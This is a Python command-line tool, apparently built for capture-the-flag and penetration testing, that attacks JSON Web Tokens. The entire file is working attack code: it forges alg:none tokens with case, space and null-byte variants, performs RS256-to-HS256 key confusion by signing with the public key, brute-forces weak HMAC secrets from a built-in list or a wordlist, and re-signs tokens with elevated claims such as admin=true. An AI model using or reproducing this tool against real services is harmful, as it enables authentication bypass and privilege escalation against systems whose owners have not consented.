#!/usr/bin/env python3
"""
jwt_none.py — test JWTs for alg:none vulnerability and forge arbitrary tokens
Also tests: alg confusion (RS256->HS256), key confusion, weak secret brute-force.
"""

import sys
import re
import json
import hmac
import base64
import hashlib
import argparse
from pathlib import Path

FLAG_RE = re.compile(r'[A-Za-z0-9_]{2,10}\{[^}]+\}', re.IGNORECASE)

# ── JWT helpers ───────────────────────────────────────────────────────────────

def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

def b64url_decode(s: str) -> bytes:
    s = s.strip()
    pad = (4 - len(s) % 4) % 4
    return base64.urlsafe_b64decode(s + "=" * pad)

def parse_jwt(token: str) -> tuple[dict, dict, bytes] | None:
    """Returns (header, payload, signature_bytes) or None."""
    parts = token.strip().split(".")
    if len(parts) != 3:
        return None
    try:
        header  = json.loads(b64url_decode(parts[0]))
        payload = json.loads(b64url_decode(parts[1]))
        sig     = b64url_decode(parts[2])
        return header, payload, sig
    except Exception as e:
        print(f"[!] Failed to parse JWT: {e}")
        return None

def build_jwt(header: dict, payload: dict, secret: bytes | None = None,
              algorithm: str | None = None) -> str:
    alg = algorithm or header.get("alg", "none")
    h = dict(header)
    h["alg"] = alg

    header_enc  = b64url_encode(json.dumps(h, separators=(",", ":")).encode())
    payload_enc = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{header_enc}.{payload_enc}".encode()

    if alg.lower() == "none":
        return f"{header_enc}.{payload_enc}."

    if alg.upper() in ("HS256", "HS384", "HS512"):
        hash_fn = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}[alg.upper()]
        sig = hmac.new(secret or b"", signing_input, hash_fn).digest()
        return f"{header_enc}.{payload_enc}.{b64url_encode(sig)}"

    raise ValueError(f"Unsupported algorithm for signing: {alg}")

def verify_hs(token: str, secret: bytes) -> bool:
    parts = token.split(".")
    if len(parts) != 3:
        return False
    header = json.loads(b64url_decode(parts[0]))
    alg = header.get("alg", "").upper()
    hash_fn = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}.get(alg)
    if not hash_fn:
        return False
    signing_input = f"{parts[0]}.{parts[1]}".encode()
    expected = hmac.new(secret, signing_input, hash_fn).digest()
    try:
        actual = b64url_decode(parts[2])
        return hmac.compare_digest(expected, actual)
    except Exception:
        return False

# ── Attack functions ──────────────────────────────────────────────────────────

ALG_NONE_VARIANTS = [
    "none", "None", "NONE", "nOnE", "NoNe",
    "nonE", "nONE", "NONE ", " none",   # spaces
    "none\x00", "\x00none",             # null bytes
    "alg:none",                          # misparse
]

def attack_alg_none(header: dict, payload: dict, modified_payload: dict | None = None) -> list[tuple[str, str]]:
    """Generate all alg:none token variants."""
    target_payload = modified_payload or payload
    results = []
    for alg_val in ALG_NONE_VARIANTS:
        h = dict(header)
        h["alg"] = alg_val
        header_enc  = b64url_encode(json.dumps(h, separators=(",",":")).encode())
        payload_enc = b64url_encode(json.dumps(target_payload, separators=(",",":")).encode())
        # Variants: empty sig, no trailing dot
        for sig in ["", ".", "x"]:
            token = f"{header_enc}.{payload_enc}.{sig}" if sig != "." else f"{header_enc}.{payload_enc}."
            results.append((f"alg={alg_val!r} sig={sig!r}", token))
    return results

def attack_hs256_with_pubkey(header: dict, payload: dict, pubkey_pem: bytes,
                              modified_payload: dict | None = None) -> str:
    """RS256->HS256 algorithm confusion: sign with public key as HMAC secret."""
    target_payload = modified_payload or payload
    h = dict(header)
    h["alg"] = "HS256"
    return build_jwt(h, target_payload, secret=pubkey_pem, algorithm="HS256")

def brute_force_secret(token: str, wordlist_path: str | None, extra_words: list[str]) -> str | None:
    """Try common and wordlist secrets against an HS256 JWT."""
    COMMON = [
        "", "secret", "password", "123456", "admin", "key", "jwt",
        "jwt_secret", "mysecret", "your-256-bit-secret", "supersecret",
        "changeme", "flag", "ctf", "token", "1234567890", "qwerty",
        "letmein", "abc123", "pass", "test", "hello", "welcome",
        "p@ssw0rd", "s3cr3t", "topsecret", "privatekey", "public",
    ]
    candidates = COMMON + extra_words
    if wordlist_path:
        try:
            with open(wordlist_path, "r", errors="replace") as f:
                candidates += [l.strip() for l in f if l.strip()]
        except Exception as e:
            print(f"[!] Wordlist error: {e}")

    print(f"[*] Trying {len(candidates)} secrets...")
    for secret in candidates:
        if verify_hs(token, secret.encode("utf-8", errors="replace")):
            return secret
    return None

def modify_payload(payload: dict, modifications: list[str]) -> dict:
    """Apply key=value modifications to payload. Supports nested with dot notation."""
    result = dict(payload)
    for mod in modifications:
        if "=" not in mod:
            continue
        key, val = mod.split("=", 1)
        key = key.strip()
        # Try to parse value as JSON first (for numbers, bools, objects)
        try:
            parsed = json.loads(val)
        except Exception:
            parsed = val
        result[key] = parsed
    return result

# ── Display ───────────────────────────────────────────────────────────────────

def print_jwt(header: dict, payload: dict, sig: bytes, label: str = ""):
    print(f"\n{'='*60}")
    if label:
        print(f"  {label}")
    print(f"  Header:  {json.dumps(header, indent=None)}")
    print(f"  Payload: {json.dumps(payload, indent=None)}")
    print(f"  Sig:     {sig.hex()[:32]}{'...' if len(sig)>16 else ''}")

    # Flag search
    for val in list(header.values()) + list(payload.values()):
        flags = FLAG_RE.findall(str(val))
        for f in flags:
            print(f"  [!!!] FLAG IN JWT: {f}")

# ── Main ──────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="JWT security tester: alg:none, alg confusion, weak secret bruteforce",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Show JWT contents
  python3 jwt_none.py eyJhbGci...

  # Generate all alg:none variants
  python3 jwt_none.py eyJhbGci... --alg-none

  # Forge with modified claims
  python3 jwt_none.py eyJhbGci... --alg-none --set "role=admin" --set "admin=true"

  # Brute-force secret
  python3 jwt_none.py eyJhbGci... --brute

  # RS256->HS256 confusion with public key
  python3 jwt_none.py eyJhbGci... --pubkey pub.pem --set "admin=true"

  # Verify with known secret
  python3 jwt_none.py eyJhbGci... --verify "mysecret"
        """
    )
    parser.add_argument("token", nargs="?", help="JWT token string or file path")
    parser.add_argument("--alg-none", action="store_true",
                        help="Generate all alg:none variants")
    parser.add_argument("--set", action="append", default=[], metavar="KEY=VALUE",
                        help="Modify payload claim (repeatable): --set role=admin --set admin=true")
    parser.add_argument("--brute", action="store_true",
                        help="Brute-force HMAC secret")
    parser.add_argument("--wordlist", default=None, help="Wordlist file for brute-force")
    parser.add_argument("--secret", action="append", default=[],
                        help="Extra secret to try in brute-force")
    parser.add_argument("--pubkey", default=None,
                        help="PEM public key file for RS256->HS256 confusion attack")
    parser.add_argument("--verify", default=None,
                        help="Verify JWT signature with this secret")
    parser.add_argument("--sign", default=None,
                        help="Sign forged JWT with this HMAC secret")
    parser.add_argument("--alg", default=None,
                        help="Override algorithm in forged token (e.g. HS256)")
    parser.add_argument("-o", "--output", default=None,
                        help="Save forged tokens to file")
    args = parser.parse_args()

    # Load token
    if not args.token and not sys.stdin.isatty():
        token = sys.stdin.read().strip()
    elif args.token:
        p = Path(args.token)
        token = p.read_text().strip() if p.exists() else args.token
    else:
        parser.print_help()
        sys.exit(1)

    # Strip "Bearer " prefix if present
    token = re.sub(r'^Bearer\s+', '', token, flags=re.IGNORECASE)

    parsed = parse_jwt(token)
    if not parsed:
        sys.exit(1)
    header, payload, sig = parsed

    print_jwt(header, payload, sig, "Original JWT")

    # Modified payload
    mod_payload = modify_payload(payload, args.set) if args.set else payload
    if mod_payload != payload:
        print(f"\n[*] Modified payload: {json.dumps(mod_payload)}")

    output_tokens = []

    # ── Verify ──
    if args.verify:
        valid = verify_hs(token, args.verify.encode())
        print(f"\n[*] Signature verification with secret={args.verify!r}: {'VALID ✓' if valid else 'INVALID ✗'}")

    # ── alg:none ──
    if args.alg_none:
        print(f"\n[*] Generating alg:none variants ({len(ALG_NONE_VARIANTS)} alg values x 3 sig formats)...")
        variants = attack_alg_none(header, payload, mod_payload)
        for label, forged in variants:
            print(f"  [{label}]")
            print(f"  {forged}")
            output_tokens.append(forged)

    # ── Custom sign ──
    elif args.sign or args.alg:
        secret = args.sign.encode() if args.sign else b""
        alg    = args.alg or header.get("alg", "none")
        try:
            forged = build_jwt(header, mod_payload, secret=secret, algorithm=alg)
            print(f"\n[*] Forged JWT (alg={alg}, secret={args.sign!r}):")
            print(f"  {forged}")
            output_tokens.append(forged)
        except Exception as e:
            print(f"[!] Signing failed: {e}")

    # ── RS256 -> HS256 confusion ──
    if args.pubkey:
        try:
            pubkey_data = Path(args.pubkey).read_bytes()
            forged = attack_hs256_with_pubkey(header, payload, pubkey_data, mod_payload)
            print(f"\n[*] RS256->HS256 confusion token (signed with public key as HMAC secret):")
            print(f"  {forged}")
            output_tokens.append(forged)
        except Exception as e:
            print(f"[!] RS256->HS256 attack failed: {e}")

    # ── Brute-force ──
    if args.brute:
        print(f"\n[*] Brute-forcing HMAC secret (alg={header.get('alg','?')})...")
        found = brute_force_secret(token, args.wordlist, args.secret)
        if found is not None:
            print(f"\n[!!!] SECRET FOUND: {found!r}")
            # Re-sign modified payload
            if mod_payload != payload:
                resigned = build_jwt(header, mod_payload,
                                     secret=found.encode(), algorithm=header.get("alg", "HS256"))
                print(f"[*] Re-signed forged token:")
                print(f"  {resigned}")
                output_tokens.append(resigned)
        else:
            print("[*] Secret not found in wordlist.")

    # ── Output ──
    if args.output and output_tokens:
        Path(args.output).write_text("\n".join(output_tokens))
        print(f"\n[*] {len(output_tokens)} token(s) saved to {args.output}")

    if not any([args.alg_none, args.sign, args.alg, args.pubkey, args.brute, args.verify]):
        print("\n[*] Use --alg-none, --brute, --sign, or --pubkey to attack.")
        print(f"[*] Use --set KEY=VALUE to modify claims before forging.")

if __name__ == "__main__":
    main()
